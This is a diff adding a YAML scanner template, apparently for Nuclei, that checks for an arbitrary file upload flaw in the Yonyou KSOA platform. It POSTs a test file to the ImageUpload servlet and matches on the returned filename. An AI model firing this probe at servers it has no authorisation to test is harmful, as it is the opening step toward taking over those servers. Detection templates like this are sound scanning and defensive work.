@@ -1,0 +1,19 @@
+id: yonyou-ksoa-ImageUpload-upload
+info:
+  name: yonyou-ksoa-ImageUpload-upload
+  author: apple
+  severity: info
+  description: 用友时空KSOA平台ImageUpload处存在任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限
+  reference:
+    - https://mp.weixin.qq.com/s/A3YXFTxrhCXOA768fUmlDg
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /servlet/com.sksoft.bill.ImageUpload?filename=1.txt&filepath=/ HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '1.txt'
